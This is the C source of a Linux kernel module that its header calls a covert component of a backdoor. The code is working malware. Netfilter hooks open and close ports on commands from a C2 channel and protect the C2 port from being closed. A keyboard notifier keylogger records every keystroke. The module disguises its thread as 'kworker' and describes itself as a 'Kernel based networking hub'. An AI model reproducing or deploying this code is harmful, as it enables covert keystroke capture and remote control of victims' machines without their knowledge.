/*
 * Author and Designer: John Agapeyev
 * Date: 2018-09-22
 * Notes:
 * The covert module for complimenting the backdoor
 */

#include <linux/init.h>
#include <linux/ip.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/slab.h>
#include <linux/tcp.h>
#include <linux/types.h>
#include <linux/udp.h>
#include <linux/un.h>
#include <net/sock.h>

#include "shared.h"

#ifndef UNIX_SOCK_PATH
#define UNIX_SOCK_PATH ("/var/run/covert_module_tls")
#endif

struct service {
    struct socket* tls_socket;
    struct task_struct* read_thread;
};

struct nf_hook_ops nfhi;
struct nf_hook_ops nfho;
struct service* svc;
struct sock* nl_sk;

unsigned char* buffer;
u16* open_ports;
u16* closed_ports;
size_t open_port_count = 0;
size_t closed_port_count = 0;

int send_msg(struct socket* sock, unsigned char* buf, size_t len);
int recv_msg(struct socket* sock, unsigned char* buf, size_t len);
int start_transmit(void);
int init_userspace_conn(void);
void UpdateChecksum(struct sk_buff* skb);
int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _param);

static struct notifier_block keysniffer_blk = {
        .notifier_call = keysniffer_cb,
};

//Keysniffer code modified from https://github.com/jarun/keysniffer/blob/master/keysniffer.c

/*
 * Keymap references:
 * https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
 * http://www.quadibloc.com/comp/scan.htm
 */
static const char* us_keymap[][2] = {
        {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"}, // 0-3
        {"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"}, // 4-7
        {"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"}, // 8-11
        {"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"}, // 12-14
        {"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"}, {"t", "T"}, {"y", "Y"},
        {"u", "U"}, {"i", "I"}, // 20-23
        {"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"}, // 24-27
        {"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"}, // 28-31
        {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"}, // 32-35
        {"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"}, // 36-39
        {"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
        {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"}, // 44-47
        {"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"}, // 48-51
        {".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
        {"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"}, {"F2", "F2"},
        {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"}, // 60-63
        {"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"}, // 64-67
        {"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"}, // 68-70
        {"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
        {"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"}, // 74-76
        {"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"}, // 77-79
        {"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
        {"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"}, // 83-85
        {"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"}, // 86-89
        {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
        {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"}, {"_PRTSCR_", "_PRTSCR_"},
        {"_RALT_", "_RALT_"}, {"\0", "\0"}, // 99-101
        {"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"}, // 102-104
        {"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"}, {"_DOWN_", "_DOWN_"},
        {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"}, // 108-110
        {"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, // 111-114
        {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, // 115-118
        {"_PAUSE_", "_PAUSE_"}, // 119
};

/*
 * function:
 *    UpdateChecksum
 *
 * return:
 *    void
 *
 * parameters:
 *    struct sk_buff* skb
 *
 * notes:
 * Recalculates the checksum of the packet after it has been modified.
 */
void UpdateChecksum(struct sk_buff* skb) {
    struct iphdr* ip_header = ip_hdr(skb);
    skb->ip_summed = CHECKSUM_NONE; //stop offloading
    skb->csum_valid = 0;
    ip_header->check = 0;
    ip_header->check = ip_fast_csum((u8*) ip_header, ip_header->ihl);

    if ((ip_header->protocol == IPPROTO_TCP) || (ip_header->protocol == IPPROTO_UDP)) {
        if (skb_is_nonlinear(skb)) {
            skb_linearize(skb);
        }

        if (ip_header->protocol == IPPROTO_TCP) {
            unsigned int tcplen;
            struct tcphdr* tcpHdr = tcp_hdr(skb);

            skb->csum = 0;
            tcplen = ntohs(ip_header->tot_len) - ip_header->ihl * 4;
            tcpHdr->check = 0;
            tcpHdr->check = csum_tcpudp_magic(ip_header->saddr, ip_header->daddr, tcplen,
                    IPPROTO_TCP, csum_partial((char*) tcpHdr, tcplen, 0));
        } else if (ip_header->protocol == IPPROTO_UDP) {
            unsigned int udplen;

            struct udphdr* udpHdr = udp_hdr(skb);
            skb->csum = 0;
            udplen = ntohs(ip_header->tot_len) - ip_header->ihl * 4;
            udpHdr->check = 0;
            udpHdr->check = csum_tcpudp_magic(ip_header->saddr, ip_header->daddr, udplen,
                    IPPROTO_UDP, csum_partial((char*) udpHdr, udplen, 0));
        }
    }
}

/*
 * function:
 *    recv_msg
 *
 * return:
 *    int
 *
 * parameters:
 *    struct socket* sock
 *    unsigned char* buf
 *    size_t len
 *
 * notes:
 * Wrapper for kernel API
 */
int recv_msg(struct socket* sock, unsigned char* buf, size_t len) {
    struct msghdr msg;
    struct kvec iov;
    int size = 0;

    memset(&msg, 0, sizeof(struct msghdr));
    memset(&iov, 0, sizeof(struct kvec));

    iov.iov_base = buf;
    iov.iov_len = len;

    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = 0;
    msg.msg_name = 0;
    msg.msg_namelen = 0;

    size = kernel_recvmsg(sock, &msg, &iov, 1, len, msg.msg_flags);

    return size;
}

/*
 * function:
 *    send_msg
 *
 * return:
 *    int
 *
 * parameters:
 *    struct socket* sock
 *    unsigned char* buf
 *    size_t len
 *
 * notes:
 * Wrapper for kernel api
 */
int send_msg(struct socket* sock, unsigned char* buf, size_t len) {
    struct msghdr msg;
    struct kvec iov;
    int size;

    memset(&msg, 0, sizeof(struct msghdr));
    memset(&iov, 0, sizeof(struct kvec));

    iov.iov_base = buf;
    iov.iov_len = len;

    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = 0;
    msg.msg_name = 0;
    msg.msg_namelen = 0;

    size = kernel_sendmsg(sock, &msg, &iov, 1, len);

    return size;
}

/*
 * function:
 *    read_TLS
 *
 * return:
 *    int
 *
 * notes:
 * Handler for reading and writing kernel module commands relating to firewall
 */
int read_TLS(void) {
    int len;
    u16 tmp_port;
    const char* bad_len = "Invalid command length\n";
    const char* bad_port = "Invalid port number\n";
    const char* open = "Port is now open\n";
    const char* close = "Port is now closed\n";
    const char* unknown = "Unknown command\n";
    const char* clear = "All port settings cleared\n";
    const char* bad_drop = "Unable to close the C2 port\n";

    while (!kthread_should_stop()) {
        tmp_port = 0;
        memset(buffer, 0, MAX_PAYLOAD);
        len = recv_msg(svc->tls_socket, buffer, MAX_PAYLOAD);
        printk(KERN_INFO "Received message from server %*.s\n", len, buffer);
        if (len < 5) {
            strcpy(buffer, bad_len);
            send_msg(svc->tls_socket, buffer, strlen(bad_len));
            continue;
        }
        if (memcmp("open ", buffer, 5) == 0) {
            //Open a port
            if (kstrtou16(buffer + 5, 10, &tmp_port)) {
                strcpy(buffer, bad_port);
                send_msg(svc->tls_socket, buffer, strlen(bad_port));
                continue;
            }
            open_ports[open_port_count++] = tmp_port;
            strcpy(buffer, open);
            send_msg(svc->tls_socket, buffer, strlen(open));
        } else if (memcmp("close ", buffer, 6) == 0) {
            //Close a port
            if (kstrtou16(buffer + 6, 10, &tmp_port)) {
                strcpy(buffer, bad_port);
                send_msg(svc->tls_socket, buffer, strlen(bad_port));
                continue;
            }
            if (tmp_port == PORT) {
                strcpy(buffer, bad_drop);
                send_msg(svc->tls_socket, buffer, strlen(bad_drop));
                continue;
            }
            closed_ports[closed_port_count++] = tmp_port;
            strcpy(buffer, close);
            send_msg(svc->tls_socket, buffer, strlen(close));
        } else if (memcmp("clear", buffer, 5) == 0) {
            open_port_count = 0;
            closed_port_count = 0;
            strcpy(buffer, clear);
            send_msg(svc->tls_socket, buffer, strlen(clear));
        } else {
            strcpy(buffer, unknown);
            send_msg(svc->tls_socket, buffer, strlen(unknown));
        }
    }
    return 0;
}

/*
 * function:
 *    init_userspace_conn
 *
 * return:
 *    int
 *
 * parameters:
 *    void
 *
 * notes:
 * Initializes the userspace connections needed.
 * Establishes tls socket with userspace.
 */
int init_userspace_conn(void) {
    int error;
    struct sockaddr_un sun;

    //TLS socket
    error = sock_create(AF_UNIX, SOCK_STREAM, 0, &svc->tls_socket);
    if (error < 0) {
        printk(KERN_ERR "cannot create socket\n");
        return error;
    }
    sun.sun_family = AF_UNIX;
    strcpy(sun.sun_path, UNIX_SOCK_PATH);

    error = kernel_connect(svc->tls_socket, (struct sockaddr*) &sun, sizeof(sun), 0);
    if (error < 0) {
        printk(KERN_ERR "cannot connect on tls socket, error code: %d\n", error);
        return error;
    }
    return 0;
}

/*
 * function:
 *    incoming hook
 *
 * return:
 *    unsigned int
 *
 * parameters:
 *    void* priv
 *    struct sk_buff* skb
 *    const struct nf_hook_state* state
 *
 * notes:
 * Netfilter hook for incoming packets.
 * See API for details on arguments
 * All this does is handle packets according to allow/drop port lists
 */
unsigned int incoming_hook(void* priv, struct sk_buff* skb, const struct nf_hook_state* state) {
    struct iphdr* ip_header = (struct iphdr*) skb_network_header(skb);
    struct tcphdr* tcp_header;
    struct udphdr* udp_header;
    int i;

    if (ip_header->protocol == IPPROTO_TCP) {
        tcp_header = (struct tcphdr*) skb_transport_header(skb);

        for (i = 0; i < closed_port_count; ++i) {
            if (ntohs(tcp_header->dest) == closed_ports[i]) {
                return NF_DROP;
            }
        }
        for (i = 0; i < open_port_count; ++i) {
            if (ntohs(tcp_header->dest) == open_ports[i]) {
                return NF_QUEUE;
            }
        }
    } else if (ip_header->protocol == IPPROTO_UDP) {
        udp_header = (struct udphdr*) skb_transport_header(skb);
        for (i = 0; i < closed_port_count; ++i) {
            if (ntohs(udp_header->dest) == closed_ports[i]) {
                return NF_DROP;
            }
        }
        for (i = 0; i < open_port_count; ++i) {
            if (ntohs(udp_header->dest) == open_ports[i]) {
                return NF_QUEUE;
            }
        }
    }
    return NF_ACCEPT;
}

/*
 * function:
 *    outgoing_hook
 *
 * return:
 *    unsigned int
 *
 * parameters:
 *    void* priv
 *    struct sk_buff* skb
 *    const struct nf_hook_state* state
 *
 * notes:
 * Netfilter hook for outgoing packets.
 * See API for details on arguments
 * All this does is handle packets according to allow/drop port lists
 */
unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook_state* state) {
    struct iphdr* ip_header = (struct iphdr*) skb_network_header(skb);
    struct tcphdr* tcp_header;
    struct udphdr* udp_header;
    int i;

    if (ip_header->protocol == IPPROTO_TCP) {
        tcp_header = (struct tcphdr*) skb_transport_header(skb);

        for (i = 0; i < closed_port_count; ++i) {
            if (ntohs(tcp_header->source) == closed_ports[i]) {
                return NF_DROP;
            }
        }
        for (i = 0; i < open_port_count; ++i) {
            if (ntohs(tcp_header->source) == open_ports[i]) {
                return NF_QUEUE;
            }
        }
    } else if (ip_header->protocol == IPPROTO_UDP) {
        udp_header = (struct udphdr*) skb_transport_header(skb);
        for (i = 0; i < closed_port_count; ++i) {
            if (ntohs(udp_header->source) == closed_ports[i]) {
                return NF_DROP;
            }
        }
        for (i = 0; i < open_port_count; ++i) {
            if (ntohs(udp_header->source) == open_ports[i]) {
                return NF_QUEUE;
            }
        }
    }
    return NF_ACCEPT;
}

int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _param) {
    size_t len;
    struct keyboard_notifier_param* param = _param;
    const char *keycode = NULL;

    printk(KERN_INFO "code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n", code, param->down, param->shift,
            param->value);

    /* Trace only when a key is pressed down */
    if (!(param->down)) {
        return NOTIFY_OK;
    }

    //if (param->value > KEY_RESERVED && param->value <= KEY_PAUSE) {
    if (param->value > -1 && param->value <= 119) {
        keycode = us_keymap[param->value][param->shift];
    } else {
        return NOTIFY_OK;
    }
    len = strlen(keycode);
    // Unmapped keycode
    if (len < 1) {
        return NOTIFY_OK;
    }

    printk(KERN_INFO "%s\n", keycode);

    return NOTIFY_OK;
}

/*
 * function:
 *    mod_init
 *
 * return:
 *    int
 *
 * parameters:
 *    void
 *
 * notes:
 * Module entry function
 */
static int __init mod_init(void) {
    int err;

    nfhi.hook = incoming_hook;
    nfhi.hooknum = NF_INET_LOCAL_IN;
    nfhi.pf = PF_INET;
    //Set hook highest priority
    nfhi.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &nfhi);

    memcpy(&nfho, &nfhi, sizeof(struct nf_hook_ops));
    nfho.hook = outgoing_hook;
    nfho.hooknum = NF_INET_LOCAL_OUT;

    nf_register_net_hook(&init_net, &nfho);

    svc = kmalloc(sizeof(struct service), GFP_KERNEL);
    if ((err = init_userspace_conn()) < 0) {
        printk(KERN_ALERT "Failed to initialize userspace sockets; error code %d\n", err);
        kfree(svc);

        nf_unregister_net_hook(&init_net, &nfho);
        nf_unregister_net_hook(&init_net, &nfhi);

        return err;
    }
    buffer = kmalloc(MAX_PAYLOAD, GFP_KERNEL);
    open_ports = kmalloc(2 * 65536, GFP_KERNEL);
    closed_ports = kmalloc(2 * 65536, GFP_KERNEL);

    svc->read_thread = kthread_run((void*) read_TLS, NULL, "kworker");
    printk(KERN_ALERT "backdoor module loaded\n");

    register_keyboard_notifier(&keysniffer_blk);

    return 0;
}

/*
 * function:
 *    mod_exit
 *
 * return:
 *    void
 *
 * parameters:
 *    void
 *
 * notes:
 * Module exit function
 */
static void __exit mod_exit(void) {
    nf_unregister_net_hook(&init_net, &nfho);
    nf_unregister_net_hook(&init_net, &nfhi);

    if (svc) {
        if (svc->tls_socket) {
            sock_release(svc->tls_socket);
            printk(KERN_INFO "release tls_socket\n");
        }
        kfree(svc);
    }

    if (buffer) {
        kfree(buffer);
    }
    if (open_ports) {
        kfree(open_ports);
    }
    if (closed_ports) {
        kfree(closed_ports);
    }
    unregister_keyboard_notifier(&keysniffer_blk);
    printk(KERN_ALERT "removed backdoor module\n");
}

module_init(mod_init);
module_exit(mod_exit);

MODULE_DESCRIPTION("Kernel based networking hub");
MODULE_LICENSE("GPL");
MODULE_AUTHOR("John Agapeyev <jagapeyev@gmail.com>");
